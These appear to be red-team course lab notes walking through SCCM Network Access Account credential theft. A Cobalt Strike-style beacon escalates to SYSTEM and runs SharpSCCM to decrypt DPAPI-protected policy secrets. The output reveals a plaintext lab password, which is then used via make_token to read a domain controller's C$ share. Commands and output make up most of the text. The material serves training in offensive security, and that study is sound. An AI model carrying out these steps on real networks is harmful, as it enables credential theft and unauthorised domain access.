In a Windows environment, the majority of computers will be domain-joined and will therefore authenticate to SCCM Software Distribution Points (SDPs) (basically just SMB shares) using their own machine account credentials.  However, some computers may not be domain-joined.  Network Access Account credentials (NAAs) are domain credentials intended to be used by these machines to access the SDPs over the network.  They are passed to the machines as part of the SCCM machine policies, which are then encrypted using DPAPI and stored locally.  If they are present, privileged users can retrieve these credential blobs via WMI or directly from disk and decrypt them to recover plaintext credentials.

Use `local naa` with `-m wmi` or `-m disk`.

`getuid` to show who running as
```powershell
beacon> getuid
[*] Tasked beacon to get userid
[+] host called home, sent: 8 bytes
[*] You are DEV\bfarmer
```
command execution failed, requires `escalated privileges`
```powershell
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe local naa -m wmi --no-banner
[*] Tasked beacon to run .NET program: SharpSCCM.exe local naa -m wmi --no-banner
[+] host called home, sent: 1233204 bytes
[+] received output:

[!] SharpSCCM must be run with local administrator privileges to retrieve policy secret blobs
[+] Completed execution in 00:00:00.1578743
```
used `connect localhost 4444` to connect as `SYSTEM`
`getuid` to show access
```powershell
[+] established link to parent beacon: 10.10.123.102
beacon> getuid
[*] Tasked beacon to get userid
[+] host called home, sent: 8 bytes
[*] You are NT AUTHORITY\SYSTEM (admin)
```
success, retrieved `NetworkAccessUsername` credentials `cyberbotic.io\sccm_svc` - adding to [[Penetration Testing v2/crto_Defender/access_Tracker|access_Tracker]]
```powershell
[12/18 22:22:43] beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe local naa -m wmi --no-banner
[12/18 22:22:56] [*] Tasked beacon to run .NET program: SharpSCCM.exe local naa -m wmi --no-banner
[12/18 22:22:56] [+] host called home, sent: 1233204 bytes
[12/18 22:22:57] [+] received output:

[+] Connecting to \\127.0.0.1\root\ccm\policy\Machine\ActualConfig

[12/18 22:22:57] [+] received output:

[+] Retrieving network access account blobs via WMI
[+] Retrieving task sequence blobs via WMI
[+] Retrieving collection variable blobs via WMI


[12/18 22:22:57] [+] received output:
[+] Reverting permissions on registry key: SECURITY\Policy\Secrets\DPAPI_SYSTEM\CurrVal\
[+] Reverting permissions on registry key: SECURITY\Policy\PolEKList

[+] Secret: DPAPI_SYSTEM
    full: 8854E5ACFA2DEEED8A5624F1F92E10662AAD856A450271F3B98E6AE2D9960122C3473C979BC8669E
     m/u: 8854E5ACFA2DEEED8A5624F1F92E10662AAD856A / 450271F3B98E6AE2D9960122C3473C979BC8669E

[12/18 22:22:58] [+] received output:

[+] SYSTEM master key cache:
    {02510c3f-79a0-416e-87df-8545bbd0d1cb}:F775686493A0308C19380B57BC8302D5C79E6BE5
    {02f5ff31-55e9-4c47-bd99-9a1c5839b227}:C6E4AEA29EA2C3631F1E49447FBB69C6886608E3
    {5ae1f2f9-ccfb-40dc-ac94-f631b2be2aff}:BBC5C38D3897BA575615BF802D3BA898AA2B257D
    {5de0381f-96bb-4037-8edc-084d9a52a118}:254047B715BA620257F424CF408256CDF94A5AD7
    {64742d69-55f4-43ba-819e-2558f8531a45}:1CDDD0947BB10D8D1C26877BD59AE71822796C9D
    {dad2a38e-5a47-4110-89c8-29c63a349728}:F679462A9D6CB3CA93B38FA9B4D192A27C88261A
    {9a7dc88b-4f53-457b-b906-b5fb93cf9acf}:6026B14E2ABCF5AEDA0214AACEC25EDE296EEEFF
    {aaa23e6b-bba8-441d-923c-ec242d6690c3}:CFBC842E78EE6713FA5DCB3C9C2D6C6D7C09F06C
    {edd9d13b-33c8-4e75-9930-342a80dd804f}:9F3B0B27A61870B9FDE5438051E180BCC1E1516F
    {f8b07b52-5dfc-48a0-8daa-561dd486c8da}:49F43AA664E8952B90757F3C3AE9F70E732F997C

[+] Decrypting network access account credentials

    NetworkAccessUsername: cyberbotic.io\sccm_svc
    NetworkAccessPassword: Cyberb0tic
```
These credentials should only have read access to the SDP, but are often times over privileged (sometimes even domain/enterprise admins).
# Begin `credential abuse`

`make_token`
```powershell
beacon> make_token cyberbotic.io\sccm_svc Cyberb0tic
[+] Impersonated cyberbotic.io\sccm_svc (netonly)
```
read access to `DC-1`
```powershell
beacon> ls \\dc-1.cyberbotic.io\c$
[*] Listing: \\dc-1.cyberbotic.io\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/15/2022 15:26:54   $Recycle.Bin
          dir     08/10/2022 04:55:17   $WinREAgent
          dir     08/10/2022 05:05:53   Boot
          dir     08/18/2021 23:34:55   Documents and Settings
          dir     08/19/2021 06:24:49   EFI
          dir     05/08/2021 08:20:24   PerfLogs
          dir     09/26/2023 09:07:25   Program Files
          dir     08/10/2022 04:06:16   Program Files (x86)
          dir     09/26/2023 09:13:26   ProgramData
          dir     08/15/2022 15:07:48   Recovery
          dir     08/24/2022 11:05:32   Shares
          dir     09/26/2023 14:28:24   System Volume Information
          dir     08/15/2022 15:09:04   Users
          dir     09/26/2023 09:10:03   Windows
 427kb    fil     08/10/2022 05:00:07   bootmgr
 1b       fil     05/08/2021 08:14:33   BOOTNXT
 12kb     fil     09/27/2023 09:28:28   DumpStack.log.tmp
 1kb      fil     09/25/2023 19:07:33   ExtADSch.log
 384mb    fil     09/27/2023 09:28:28   pagefile.sys
```
An alternate approach is to request a copy of the policy directly from SCCM using `get naa`.  This also requires local admin on the local machine to obtain a copy of its SMS Signing and SMS Encryption certificates.